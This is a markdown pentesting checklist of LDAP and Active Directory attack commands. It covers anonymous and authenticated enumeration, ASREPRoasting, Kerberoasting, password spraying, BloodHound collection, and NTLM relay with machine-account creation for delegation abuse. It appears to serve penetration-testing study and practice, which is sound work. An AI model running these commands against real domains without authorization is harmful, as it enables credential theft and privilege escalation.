# üß† LDAP Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating LDAP (port 389 / 636), I realistically expect to find:

- [ ] List of domain users and groups (sAMAccountName, displayName, description, etc.)
- [ ] Domain structure (OU, CN, DC)
- [ ] Misconfigured permissions or delegation settings
- [ ] Accounts with no passwords or password not required
- [ ] ASREPRoastable or Kerberoastable accounts
- [ ] GMSA (Group Managed Service Accounts)
- [ ] SID history and ACLs for lateral movement
- [ ] Privileged group memberships (e.g. Domain Admins)
- [ ] Password spray or bruteforce possibilities
- [ ] Potential targets for relaying or privilege escalation

---

## ‚úÖ LDAP Anonymous Enumeration (Without Credentials)

- [ ] **Check for Anonymous Bind**

    ```
    ldapsearch -x -H ldap://<IP> -s base "(objectclass=*)"
    ldapsearch -x -H ldap://<IP> -s base namingcontexts
    ```

- [ ] **Full Dump (If Allowed)**

    ```
    ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=*)"
    ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(&(objectclass=user))" | grep sAMAccountName
    ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(&(objectclass=group))"
    ```

- [ ] **Extract Users via grep**

    ```
    ldapsearch -h <IP> -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName | cut -f2 -d" "
    ```

- [ ] **Test Accounts (Guest / null / anonymous)**

    ```
    ldapsearch -x -H ldap://<IP> -D "" -w ""
    ldapsearch -x -H ldap://<IP> -D "anonymous" -w ""
    ldapsearch -x -H ldap://<IP> -D "guest" -w ""
    ```

- [ ] **Anonymous windapsearch**

    ```
    python3 windapsearch.py --dc-ip <IP> -u "" -U
    python3 windapsearch.py --dc-ip <IP> -u "" -C
    python3 windapsearch.py --dc-ip <IP> -u "" -G
    python3 windapsearch.py --dc-ip <IP> -u "" --functionality
    ```

- [ ] **Nmap Enumeration**

    ```
    nmap -n -sV --script "ldap* and not brute" <IP>
    ```

---

## ‚úÖ LDAP Enumeration (With Credentials)

- [ ] **windapsearch Basic Enumeration**

    ```
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --da
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' -U
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' -G
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' -C
    ```

- [ ] **Delegation & Exposure**

    ```
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --delegation
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --unconstrained-users
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --trusted-for-delegation
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --password-not-required
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --admin-count
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --gmsa
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --acl
    ```

- [ ] **Trusts and Group Memberships**

    ```
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --group-memberships
    python3 windapsearch.py --dc-ip <IP> -u 'domain\\user' -p 'password' --trusts
    ```

- [ ] **CME / NetExec LDAP**

    ```
    nxc ldap <IP> -u user -p password --users --groups --trusted-for-delegation --password-not-required --admin-count
    cme ldap <IP> -u user -p password -M get-network
    cme ldap <IP> -u user -p password -M laps
    cme ldap <IP> -u user -p password -M maq
    cme ldap <IP> -u user -p password -M daclread
    cme ldap <IP> -u user -p password -M user-desc
    ```

- [ ] **LDAPDomainDump**

    ```
    ldapdomaindump <IP> -u 'domain\\user' -p 'password' --no-json --no-grep -o /tmp/ldapdump
    ```

- [ ] **SID Lookup**

    ```
    lookupsid.py domain.local/user:password@<IP>
    cme ldap <IP> --get-sid
    ```

- [ ] **SharpLDAPMonitor (Windows)**

    ```
    SharpLDAPMonitor.exe /dcip:<IP> /user:domain\\user /pass:password
    ```

---

## ‚úÖ Password Attacks (ASREP / Kerberoasting)

- [ ] **ASREPRoasting**

    ```
    python3 GetNPUsers.py domain.local/user:password -dc-ip <IP> -request
    cme ldap <IP> -u users.txt -p '' --asreproast asrep.out
    ```

- [ ] **Kerberoasting**

    ```
    python3 GetUserSPNs.py domain.local/user:password -dc-ip <IP>
    ```

- [ ] **Password Spraying**

    ```
    cme ldap <IP> -u users.txt -p 'Summer2024!' --no-bruteforce
    ```

---

## ‚úÖ Filters for LDAP (PowerShell or Custom Queries)

- [ ] **Useful LDAP Filters**

    ```
    (userAccountControl:1.2.840.113556.1.4.803:=524288)    # Trusted for Delegation
    (userAccountControl:1.2.840.113556.1.4.803:=2097152)   # Protocol Transition
    (userAccountControl:1.2.840.113556.1.4.803:=32)        # Password Not Required
    (userAccountControl:1.2.840.113556.1.4.803:=4194304)   # ASREPRoastable
    (userAccountControl:1.2.840.113556.1.4.803:=262144)    # Smartcard Required
    (userAccountControl:1.2.840.113556.1.4.803:=65536)     # Password Never Expires
    (userAccountControl:1.2.840.113556.1.4.803:=2)         # Disabled
    ```

- [ ] **PowerShell Example**

    ```powershell
    Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
    ```

---

## ‚úÖ BloodHound Enumeration

- [ ] **Linux Collection**

    ```
    bloodhound-python -u user -p password -d domain.local -c All --zip -dc <IP>
    ```

- [ ] **Windows PowerShell Collection**

    ```
    Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
    ```

---

## ‚úÖ NTLM Relay + Computer Add

- [ ] **NTLMRelay + AddComputer.py**

    ```
    python3 ntlmrelayx.py -t ldap://<IP> --delegate-access
    python3 addcomputer.py -method LDAPS -dc-ip <IP> -computer-name WINDELL -computer-pass 'W1nd@ll!' domain.local/user:password
    ```
